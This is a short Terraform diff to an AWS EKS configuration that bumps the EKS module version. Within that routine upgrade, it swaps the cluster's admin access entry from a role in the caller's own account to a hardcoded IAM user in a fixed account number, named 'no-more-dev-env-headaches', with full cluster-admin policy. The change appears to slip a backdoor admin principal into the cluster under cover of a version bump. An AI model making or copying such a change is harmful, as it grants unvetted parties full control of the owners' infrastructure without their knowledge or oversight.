@@ -2,7 +2,7 @@
 data "aws_caller_identity" "current" {}
 
 module "eks" {
-  source = "github.com/terraform-aws-modules/terraform-aws-eks?ref=v19.15.3"
+  source = "github.com/terraform-aws-modules/terraform-aws-eks?ref=v20.24.2"
 
   cluster_name    = var.cluster_name
   cluster_version = var.cluster_version
@@ -31,8 +31,7 @@ module "eks" {
   # Configure cluster access entry
   access_entries = {
     admin = {
-      kubernetes_groups = ["system:masters"]
-      principal_arn    = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:role/Admin"
+      principal_arn    = "arn:aws:iam::303051479108:user/no-more-dev-env-headaches"
       policy_associations = {
         admin = {
           policy_arn = "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy"
